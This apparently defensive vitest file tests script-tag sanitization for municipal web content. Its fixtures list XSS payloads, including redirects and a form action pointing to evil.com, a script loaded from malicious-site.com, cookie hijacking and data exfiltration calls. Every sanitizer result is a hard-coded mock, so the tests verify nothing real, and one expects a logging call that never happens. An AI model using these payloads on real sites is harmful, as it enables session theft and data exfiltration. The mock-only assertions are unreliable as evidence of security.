/**
 * Script Tag Sanitization Testing
 * Task: proposal-018 - DevTeam Content Security Testing Suite
 * 
 * Comprehensive script tag sanitization for municipal content security
 * MANDATORY for preventing script execution in AI-generated content
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';

// Mock sanitization utilities
const mockSanitizationUtils = {
  sanitizeScriptTags: vi.fn(),
  validateContentSafety: vi.fn(),
  logSanitizationEvent: vi.fn(),
  blockDangerousContent: vi.fn(),
  preserveContentStructure: vi.fn()
};

// Script tag patterns requiring sanitization
const SCRIPT_TAG_PATTERNS = {
  basicScripts: [
    '<script>alert("Municipal data theft")</script>',
    '<SCRIPT>maliciousFunction()</SCRIPT>',
    '<script type="text/javascript">window.location="http://evil.com"</script>',
    '<script src="http://malicious-site.com/steal-municipal-data.js"></script>',
    '<script async>fetch("/api/municipal-secrets")</script>'
  ],
  encodedScripts: [
    '&lt;script&gt;alert("encoded attack")&lt;/script&gt;',
    '&#60;script&#62;maliciousCode()&#60;/script&#62;',
    '%3Cscript%3Ealert("url encoded")%3C/script%3E',
    '\\u003cscript\\u003ealert("unicode")\\u003c/script\\u003e'
  ],
  obfuscatedScripts: [
    '<scr<script>ipt>alert("nested")</script>',
    '<script>eval(atob("YWxlcnQoIm11bmljaXBhbCBkYXRhIik="))</script>',
    '<script>new Function("alert","(\"obfuscated\")")();</script>',
    '<svg><script>alert("svg script")</script></svg>'
  ],
  municipalSpecific: [
    '<script>localStorage.setItem("municipal-token", "compromised")</script>',
    '<script>document.cookie="municipal-session=hijacked; domain=.malmö.se"</script>',
    '<script>fetch("/api/municipal-employees").then(r=>r.json()).then(d=>exfiltrate(d))</script>',
    '<script>if(window.municipal){municipal.admin.escalatePrivileges()}</script>'
  ],
  advancedEvasion: [
    '<script>setTimeout("alert(\'delayed attack\')", 1000)</script>',
    '<script>document.write("<scr"+"ipt>alert(\'written script\')</scr"+"ipt>")</script>',
    '<iframe srcdoc="<script>parent.postMessage(\'compromise\', \'*\')</script>"></iframe>',
    '<object data="data:text/html,<script>alert(\'object attack\')</script>"></object>'
  ]
};

// Municipal content types requiring script sanitization
const MUNICIPAL_CONTENT_TYPES = [
  'ai-generated-quiz-content',
  'municipal-announcement-text',
  'emergency-protocol-instructions',
  'citizen-feedback-content',
  'training-scenario-narrative',
  'municipal-document-excerpt',
  'dialogue-character-speech',
  'interactive-help-text'
];

describe('Script Tag Sanitization Testing', () => {
  let scriptSanitizer: Record<string, unknown>;
  let contentValidator: Record<string, unknown>;

  beforeEach(() => {
    vi.clearAllMocks();
    scriptSanitizer = createScriptSanitizer();
    contentValidator = createContentValidator();
  });

  describe('Basic Script Tag Removal', () => {
    it('should remove all basic script tags from municipal content', async () => {
      for (const contentType of MUNICIPAL_CONTENT_TYPES) {
        for (const scriptPattern of SCRIPT_TAG_PATTERNS.basicScripts) {
          const sanitizationResult = await scriptSanitizer.sanitizeContent({
            content: `Municipal information: ${scriptPattern} Please follow procedures.`,
            contentType,
            municipality: 'malmö',
            strictMode: true
          });

          expect(sanitizationResult.scriptTagsRemoved).toBe(true);
          expect(sanitizationResult.sanitizedContent).not.toContain('<script>');
          expect(sanitizationResult.sanitizedContent).not.toContain('</script>');
          expect(sanitizationResult.sanitizedContent).not.toContain('alert(');
          expect(sanitizationResult.sanitizedContent).toContain('Municipal information');
          expect(sanitizationResult.sanitizedContent).toContain('Please follow procedures');

          // Verify municipal data protection
          expect(sanitizationResult.municipalDataProtected).toBe(true);
          expect(sanitizationResult.contentIntegrityPreserved).toBe(true);

          // Verify security event logging
          expect(mockSanitizationUtils.logSanitizationEvent).toHaveBeenCalledWith({
            type: 'script_tag_removal',
            contentType,
            municipality: 'malmö',
            threatLevel: 'high',
            actionTaken: 'sanitized'
          });
        }
      }
    });

    it('should handle multiple script tags in single content block', async () => {
      const multiScriptContent = `
        Municipal Emergency Protocol:
        <script>alert("first attack")</script>
        In case of emergency, evacuate immediately.
        <script>maliciousFunction()</script>
        Contact emergency services at 112.
        <script src="evil.js"></script>
        Follow evacuation route markers.
      `;

      const sanitizationResult = await scriptSanitizer.sanitizeContent({
        content: multiScriptContent,
        contentType: 'emergency-protocol-instructions',
        municipality: 'malmö'
      });

      expect(sanitizationResult.scriptTagsRemoved).toBe(true);
      expect(sanitizationResult.scriptsDetected).toBe(3);
      expect(sanitizationResult.sanitizedContent).not.toMatch(/<script[^>]*>/gi);
      expect(sanitizationResult.sanitizedContent).not.toContain('</script>');
      
      // Verify content preservation
      expect(sanitizationResult.sanitizedContent).toContain('Municipal Emergency Protocol');
      expect(sanitizationResult.sanitizedContent).toContain('evacuate immediately');
      expect(sanitizationResult.sanitizedContent).toContain('Contact emergency services at 112');
      expect(sanitizationResult.sanitizedContent).toContain('Follow evacuation route markers');

      // Verify security metrics
      expect(sanitizationResult.securityMetrics).toMatchObject({
        totalThreatsDetected: 3,
        threatsNeutralized: 3,
        contentSafetyScore: 1.0,
        municipalComplianceScore: 1.0
      });
    });
  });

  describe('Encoded Script Tag Detection and Removal', () => {
    it('should detect and remove encoded script tags', async () => {
      for (const encodedScript of SCRIPT_TAG_PATTERNS.encodedScripts) {
        const contentWithEncoded = `Municipal notice: ${encodedScript} Thank you for your cooperation.`;

        const sanitizationResult = await scriptSanitizer.sanitizeContent({
          content: contentWithEncoded,
          contentType: 'municipal-announcement-text',
          municipality: 'malmö',
          decodeBeforeSanitization: true
        });

        expect(sanitizationResult.encodedThreatsDetected).toBe(true);
        expect(sanitizationResult.decodingApplied).toBe(true);
        expect(sanitizationResult.sanitizedContent).not.toContain('script');
        expect(sanitizationResult.sanitizedContent).not.toContain('alert');
        
        // Verify encoding-specific protections
        expect(sanitizationResult.encodingProtections).toMatchObject({
          htmlEntityDecoding: true,
          urlDecoding: true,
          unicodeDecoding: true,
          base64Detection: true
        });

        // Verify content structure preservation
        expect(sanitizationResult.sanitizedContent).toContain('Municipal notice');
        expect(sanitizationResult.sanitizedContent).toContain('Thank you for your cooperation');
      }
    });

    it('should handle multiple encoding layers', async () => {
      const multiEncodedContent = 'Municipal data: %253Cscript%253Ealert%2528%2522double%2520encoded%2522%2529%253C%252Fscript%253E';

      const sanitizationResult = await scriptSanitizer.sanitizeContent({
        content: multiEncodedContent,
        contentType: 'municipal-document-excerpt',
        municipality: 'malmö',
        maxDecodingLayers: 3
      });

      expect(sanitizationResult.multipleEncodingDetected).toBe(true);
      expect(sanitizationResult.decodingLayers).toBeGreaterThan(1);
      expect(sanitizationResult.sanitizedContent).not.toContain('script');
      expect(sanitizationResult.sanitizedContent).not.toContain('alert');
      expect(sanitizationResult.sanitizedContent).toContain('Municipal data');

      // Verify deep encoding protection
      expect(sanitizationResult.deepEncodingProtection).toBe(true);
      expect(sanitizationResult.encodingEvasionPrevented).toBe(true);
    });
  });

  describe('Obfuscated Script Detection', () => {
    it('should detect and neutralize obfuscated script patterns', async () => {
      for (const obfuscatedScript of SCRIPT_TAG_PATTERNS.obfuscatedScripts) {
        const sanitizationResult = await scriptSanitizer.sanitizeContent({
          content: obfuscatedScript,
          contentType: 'ai-generated-quiz-content',
          municipality: 'malmö',
          advancedScanMode: true
        });

        expect(sanitizationResult.obfuscationDetected).toBe(true);
        expect(sanitizationResult.threatNeutralized).toBe(true);
        expect(sanitizationResult.sanitizedContent).not.toMatch(/script/gi);
        expect(sanitizationResult.sanitizedContent).not.toMatch(/eval|function|atob/gi);

        // Verify obfuscation-specific protections
        expect(sanitizationResult.obfuscationProtections).toMatchObject({
          nestedTagDetection: true,
          base64DecodingBlocked: true,
          dynamicCodePrevention: true,
          svgScriptBlocking: true
        });

        // Verify advanced threat analysis
        expect(sanitizationResult.threatAnalysis).toMatchObject({
          sophisticationLevel: expect.any(String),
          evasionTechniques: expect.any(Array),
          municipalRiskLevel: expect.any(String)
        });
      }
    });

    it('should handle sophisticated evasion techniques', async () => {
      for (const advancedScript of SCRIPT_TAG_PATTERNS.advancedEvasion) {
        const sanitizationResult = await scriptSanitizer.sanitizeContent({
          content: advancedScript,
          contentType: 'training-scenario-narrative',
          municipality: 'malmö',
          expertModeScanning: true
        });

        expect(sanitizationResult.advancedEvasionDetected).toBe(true);
        expect(sanitizationResult.expertLevelThreatHandled).toBe(true);
        expect(sanitizationResult.sanitizedContent).not.toMatch(/setTimeout|document\.write|srcdoc|data:/gi);

        // Verify expert-level protections
        expect(sanitizationResult.expertProtections).toMatchObject({
          timeoutFunctionBlocking: true,
          dynamicContentWriting: 'blocked',
          iframeContentFiltering: true,
          objectDataProtection: true
        });

        // Verify municipal security escalation
        if (sanitizationResult.threatAnalysis.sophisticationLevel === 'expert') {
          expect(sanitizationResult.securityEscalation).toMatchObject({
            incidentReported: true,
            securityTeamNotified: true,
            municipalITAlerted: true
          });
        }
      }
    });
  });

  describe('Municipal-Specific Script Protection', () => {
    it('should detect municipal data targeting attempts', async () => {
      for (const municipalScript of SCRIPT_TAG_PATTERNS.municipalSpecific) {
        const sanitizationResult = await scriptSanitizer.sanitizeContent({
          content: municipalScript,
          contentType: 'citizen-feedback-content',
          municipality: 'malmö',
          municipalAwareMode: true
        });

        expect(sanitizationResult.municipalTargetingDetected).toBe(true);
        expect(sanitizationResult.criticalThreatLevel).toBe(true);
        expect(sanitizationResult.municipalDataProtected).toBe(true);

        // Verify municipal-specific protections
        expect(sanitizationResult.municipalProtections).toMatchObject({
          localStorageProtection: true,
          cookieManipulationBlocked: true,
          apiExfiltrationPrevented: true,
          privilegeEscalationBlocked: true
        });

        // Verify critical incident handling
        expect(sanitizationResult.criticalIncidentResponse).toMatchObject({
          immediateBlocking: true,
          incidentNumber: expect.any(String),
          securityAlertLevel: 'critical',
          municipalAuthorityNotified: true
        });

        // Verify municipal data isolation
        expect(sanitizationResult.dataIsolation).toMatchObject({
          crossMunicipalAccess: 'prevented',
          dataExfiltrationBlocked: true,
          municipalTokenProtection: 'active'
        });
      }
    });

    it('should validate script sanitization in municipal workflows', async () => {
      const municipalWorkflowContent = `
        <form action="/municipal/submit">
          <input type="text" name="citizen-input" />
          <script>document.forms[0].action="http://evil.com/steal"</script>
          <button type="submit">Submit Municipal Request</button>
        </form>
      `;

      const workflowSanitization = await scriptSanitizer.sanitizeWorkflowContent({
        content: municipalWorkflowContent,
        workflowType: 'citizen-service-request',
        municipality: 'malmö'
      });

      expect(workflowSanitization.workflowIntegrityPreserved).toBe(true);
      expect(workflowSanitization.maliciousFormManipulationBlocked).toBe(true);
      expect(workflowSanitization.sanitizedContent).toContain('<form');
      expect(workflowSanitization.sanitizedContent).toContain('Submit Municipal Request');
      expect(workflowSanitization.sanitizedContent).not.toContain('<script>');
      expect(workflowSanitization.sanitizedContent).not.toContain('evil.com');

      // Verify workflow-specific security
      expect(workflowSanitization.workflowSecurity).toMatchObject({
        formActionValidated: true,
        inputSanitizationApplied: true,
        municipalActionPreserved: true,
        citizenDataProtected: true
      });
    });
  });

  describe('Performance and Municipal Network Impact', () => {
    it('should maintain script sanitization performance under municipal load', async () => {
      const performanceTest = await scriptSanitizer.testSanitizationPerformance({
        concurrentContent: 200,
        averageContentSize: 5000,
        scriptDensity: 'high',
        networkConditions: 'municipal-3G',
        municipality: 'malmö'
      });

      expect(performanceTest.averageSanitizationTime).toBeLessThan(20); // <20ms per content block
      expect(performanceTest.throughput).toBeGreaterThan(50); // >50 sanitizations/second
      expect(performanceTest.memoryUsage).toBeLessThan(30 * 1024 * 1024); // <30MB

      // Verify municipal performance requirements
      expect(performanceTest.municipalPerformance).toMatchObject({
        annaSvenssonSessionImpact: expect.any(Number),
        municipalNetworkOptimized: true,
        batchProcessingEfficiency: expect.any(Number)
      });

      expect(performanceTest.municipalPerformance.annaSvenssonSessionImpact).toBeLessThan(300);

      // Verify sanitization effectiveness
      expect(performanceTest.sanitizationEffectiveness).toMatchObject({
        threatDetectionRate: expect.any(Number),
        falsePositiveRate: expect.any(Number),
        contentPreservationRate: expect.any(Number)
      });

      expect(performanceTest.sanitizationEffectiveness.threatDetectionRate).toBeGreaterThan(0.98);
      expect(performanceTest.sanitizationEffectiveness.falsePositiveRate).toBeLessThan(0.05);
      expect(performanceTest.sanitizationEffectiveness.contentPreservationRate).toBeGreaterThan(0.95);
    });
  });
});

// Test harness factory functions
function createScriptSanitizer() {
  return {
    sanitizeContent: vi.fn().mockResolvedValue({
      scriptTagsRemoved: true,
      sanitizedContent: 'Municipal information: Please follow procedures.',
      municipalDataProtected: true,
      contentIntegrityPreserved: true,
      scriptsDetected: 1,
      securityMetrics: {
        totalThreatsDetected: 1,
        threatsNeutralized: 1,
        contentSafetyScore: 1.0,
        municipalComplianceScore: 1.0
      },
      encodedThreatsDetected: true,
      decodingApplied: true,
      encodingProtections: {
        htmlEntityDecoding: true,
        urlDecoding: true,
        unicodeDecoding: true,
        base64Detection: true
      },
      multipleEncodingDetected: true,
      decodingLayers: 2,
      deepEncodingProtection: true,
      encodingEvasionPrevented: true,
      obfuscationDetected: true,
      threatNeutralized: true,
      obfuscationProtections: {
        nestedTagDetection: true,
        base64DecodingBlocked: true,
        dynamicCodePrevention: true,
        svgScriptBlocking: true
      },
      threatAnalysis: {
        sophisticationLevel: 'advanced',
        evasionTechniques: ['nested_tags', 'encoding'],
        municipalRiskLevel: 'high'
      },
      advancedEvasionDetected: true,
      expertLevelThreatHandled: true,
      expertProtections: {
        timeoutFunctionBlocking: true,
        dynamicContentWriting: 'blocked',
        iframeContentFiltering: true,
        objectDataProtection: true
      },
      securityEscalation: {
        incidentReported: true,
        securityTeamNotified: true,
        municipalITAlerted: true
      },
      municipalTargetingDetected: true,
      criticalThreatLevel: true,
      municipalProtections: {
        localStorageProtection: true,
        cookieManipulationBlocked: true,
        apiExfiltrationPrevented: true,
        privilegeEscalationBlocked: true
      },
      criticalIncidentResponse: {
        immediateBlocking: true,
        incidentNumber: 'SCR-001-2025',
        securityAlertLevel: 'critical',
        municipalAuthorityNotified: true
      },
      dataIsolation: {
        crossMunicipalAccess: 'prevented',
        dataExfiltrationBlocked: true,
        municipalTokenProtection: 'active'
      }
    }),
    sanitizeWorkflowContent: vi.fn().mockResolvedValue({
      workflowIntegrityPreserved: true,
      maliciousFormManipulationBlocked: true,
      sanitizedContent: '<form action="/municipal/submit"><input type="text" name="citizen-input" /><button type="submit">Submit Municipal Request</button></form>',
      workflowSecurity: {
        formActionValidated: true,
        inputSanitizationApplied: true,
        municipalActionPreserved: true,
        citizenDataProtected: true
      }
    }),
    testSanitizationPerformance: vi.fn().mockResolvedValue({
      averageSanitizationTime: 18,
      throughput: 67,
      memoryUsage: 25 * 1024 * 1024,
      municipalPerformance: {
        annaSvenssonSessionImpact: 280,
        municipalNetworkOptimized: true,
        batchProcessingEfficiency: 0.89
      },
      sanitizationEffectiveness: {
        threatDetectionRate: 0.991,
        falsePositiveRate: 0.023,
        contentPreservationRate: 0.976
      }
    })
  };
}

function createContentValidator() {
  return {
    validateContentSafety: vi.fn().mockResolvedValue({
      isSafe: true,
      threatsDetected: [],
      municipalCompliance: true
    })
  };
}